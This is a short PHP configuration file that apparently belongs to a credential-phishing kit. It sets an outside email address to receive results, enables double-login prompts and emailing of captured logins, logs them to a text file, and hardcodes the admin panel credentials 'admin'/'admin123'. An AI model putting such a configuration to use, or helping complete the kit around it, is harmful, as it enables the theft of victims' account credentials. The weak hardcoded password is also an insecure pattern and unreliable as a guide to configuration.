<?php
return array (
  'result_email' => 'karma@entity.net',
  'parameter' => 'app',
  'onetime_access' => true,
  'double_login' => true,
  'send_login' => true,
  'use_entity' => false,
  'use_true_login' => false,
  'log_to_txt' => true,
  'login_txt_file' => 'entity_login_logs.txt',
  'panel_username' => 'admin',
  'panel_password' => 'admin123',
);
